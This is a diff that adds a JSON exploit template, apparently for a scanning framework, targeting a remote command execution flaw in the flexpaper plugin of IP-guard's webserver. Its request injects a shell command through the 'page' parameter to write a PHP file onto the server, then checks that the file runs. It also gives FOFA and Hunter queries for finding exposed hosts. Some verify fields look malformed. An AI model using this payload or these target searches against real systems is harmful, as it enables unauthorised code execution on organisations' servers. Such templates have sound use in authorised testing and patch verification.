@@ -1,0 +1,37 @@
+{
+  "product": "IP-guard",
+  "vul_name": "IP-guard flexpaper 远程命令执行",
+  "type": "命令执行",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "IP-guard Webserver远程命令执行漏洞（RCE）的问题，是因为旧版本申请审批的文件预览功能用到了一个开源的插件 flexpaper，使用的这个插件版本存在远程命令执行漏洞，新版本已不再使用 flexpaper。",
+  "version": "溢信科技 IP-guard<4.81.0307.0\n",
+  "note": "验证文件: /ipg/static/appr/lib/flexpaper/php/52e039302a62d077.php",
+  "search": {
+    "FOFA": "app=\"IP-guard\"",
+    "Hunter": "web.title=\"IP-guard\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_61872115/article/details/134325465",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=%7C%7Cecho+^95cc64dd2825f9df13ec4ad683ecf339^%3E+%352e039302a62d077.php"
+    },
+    "verify": {
+      "method": "/ipg/static/appr/lib/flexpaper/php/52e039302a62d077.php",
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "PHP"
+        },
+        {
+          "body": "Version"
+        }
+      ]
+    }
+  }
+}
